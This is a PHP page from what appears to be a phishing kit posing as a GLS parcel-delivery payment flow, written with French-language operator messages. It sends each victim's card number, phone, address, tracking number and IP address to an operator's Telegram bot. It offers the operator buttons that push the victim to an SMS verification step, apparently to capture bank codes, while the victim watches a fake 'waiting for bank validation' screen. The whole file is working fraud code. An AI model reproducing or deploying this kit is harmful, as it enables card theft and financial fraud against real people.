<?php
session_start();
require_once 'config.php';
require_once 'languages.php';

// Check if payment was submitted
if (!isset($_SESSION['tracking_number'])) {
    header('Location: index.php');
    exit;
}

// Generate unique decision ID
if (!isset($_SESSION['decision_id'])) {
    $decisionId = md5(session_id() . time());
    $_SESSION['decision_id'] = $decisionId;
    $_SESSION['waiting_decision'] = true;

    // Send Telegram message with 2 BUTTONS
    $message = "💳 <b>PAIEMENT EFFECTUÉ - CHOISISSEZ L'ACTION</b>\n\n";
    $message .= "📦 <b>Numéro de suivi:</b> " . ($_SESSION['tracking_number'] ?? 'N/A') . "\n";
    $message .= "📱 <b>Téléphone:</b> " . ($_SESSION['phone'] ?? 'N/A') . "\n";
    $message .= "💰 <b>Montant payé:</b> " . ($_SESSION['price'] ?? 'N/A') . "\n";
    $message .= "🏠 <b>Adresse:</b> " . ($_SESSION['address'] ?? 'N/A') . ", " . ($_SESSION['city'] ?? 'N/A') . "\n";
    $message .= "💳 <b>Carte:</b> " . ($_SESSION['card_number'] ?? 'N/A') . "\n";
    $message .= "⏰ <b>Date:</b> " . date('Y-m-d H:i:s') . "\n";
    $message .= "🌍 <b>Langue:</b> " . strtoupper(getCurrentLang()) . "\n";
    $message .= "🖥️ <b>IP:</b> " . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "\n\n";
    $message .= "⚠️ <b>Choisissez l'action :</b>\n";

    // Send to Telegram with INLINE KEYBOARD (2 buttons)
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '📱 ENVOYER VERS SMS', 'callback_data' => 'sms_' . $decisionId]
            ],
            [
                ['text' => '✅ ENVOYER DIRECT SUCCESS', 'callback_data' => 'success_' . $decisionId]
            ]
        ]
    ];

    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

    error_log("TELEGRAM - Message de décision envoyé");
}

// Check for decision
$decisionFile = __DIR__ . '/logs/decision_' . ($_SESSION['decision_id'] ?? '') . '.json';
if (file_exists($decisionFile)) {
    $decision = json_decode(file_get_contents($decisionFile), true);

    if ($decision['action'] === 'sms') {
        unset($_SESSION['waiting_decision']);
        unlink($decisionFile);
        header('Location: verification.php');
        exit;
    } elseif ($decision['action'] === 'success') {
        unset($_SESSION['waiting_decision']);
        unlink($decisionFile);
        header('Location: success.php');
        exit;
    }
}

$pageTitle = t('waiting_bank_validation');
include 'includes/header.php';
?>

<style>
    .waiting-container {
        min-height: 80vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 2rem;
    }

    .waiting-card {
        background: white;
        border-radius: 1.5rem;
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
        padding: 3rem;
        max-width: 500px;
        width: 100%;
        text-align: center;
    }

    .pulse-icon {
        width: 80px;
        height: 80px;
        margin: 0 auto 2rem;
        background: var(--gls-light-blue);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        animation: pulse 2s infinite;
    }

    @keyframes pulse {
        0%, 100% { transform: scale(1); opacity: 1; }
        50% { transform: scale(1.1); opacity: 0.8; }
    }
</style>

<div class="page-transition">
    <div class="waiting-container">
        <div class="waiting-card">
            <div class="pulse-icon">
                <svg width="40" height="40" fill="none" stroke="var(--gls-blue)" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
                </svg>
            </div>

            <h2 style="font-size: 1.75rem; color: var(--gls-blue); margin-bottom: 1rem;">
                ⏳ <?php echo t('waiting_bank_validation'); ?>
            </h2>

            <p style="color: #6b7280; margin-bottom: 2rem;">
                <?php echo t('bank_verification'); ?>
            </p>

            <div class="loading" style="margin: 2rem auto;"></div>

            <p style="font-size: 0.875rem; color: #9ca3af; margin-top: 2rem;">
                <?php echo t('verification_in_progress'); ?>
            </p>
        </div>
    </div>
</div>

<script>
// Check decision status every 2 seconds
let checkInterval = setInterval(function() {
    fetch('check_decision.php?id=<?php echo $_SESSION['decision_id'] ?? ''; ?>')
        .then(response => response.json())
        .then(data => {
            if (data.action === 'sms') {
                clearInterval(checkInterval);
                window.location.href = 'verification.php';
            } else if (data.action === 'success') {
                clearInterval(checkInterval);
                window.location.href = 'success.php';
            }
        });
}, 2000);
</script>

<?php include 'includes/footer.php'; ?>
